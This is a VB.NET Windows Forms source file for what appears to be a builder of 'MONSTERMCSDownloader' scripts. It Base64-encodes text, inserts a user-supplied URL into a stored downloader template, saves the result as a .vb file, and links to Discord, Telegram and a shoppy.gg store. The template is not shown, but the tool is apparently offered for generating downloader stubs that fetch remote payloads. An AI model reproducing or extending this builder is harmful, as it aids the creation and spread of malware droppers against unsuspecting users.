Imports System.IO
Public Class Demo
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(TextBox1.Text)
        TextBox1.Text = TextBox1.Text
        TextBox1.Clear()
        RichTextBox1.Text = Convert.ToBase64String(byt)
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim stellervbs1 As String = My.Settings.c
        stellervbs1 = stellervbs1.Replace("%URL%", (TextBox2.Text))
        Dim c As New SaveFileDialog
        With c
            .FileName = "MONSTERMCSDownloader"
            .Filter = "vb|*.VB"
            .ShowDialog()
        End With
        System.IO.File.WriteAllText(c.FileName, stellervbs1)
        MessageBox.Show("successfully : " & c.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If String.IsNullOrEmpty(RichTextBox1.Text) Then
            MsgBox("There is nothing to copy", MsgBoxStyle.Critical)
        End If
        RichTextBox1.SelectAll()
        RichTextBox1.Copy()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Process.Start("https://discord.gg/QgzvUVHhgF")
        Process.Start("https://www.youtube.com/channel/UCTgM5jrZ7AKcsdIsa8NSfxA/videos")
        Process.Start("https://magholarabeee.blogspot.com/")
        Process.Start("https://t.me/MONSTERMCSY")
        Process.Start("https://shoppy.gg/@nor.adlb1")
    End Sub
End Class
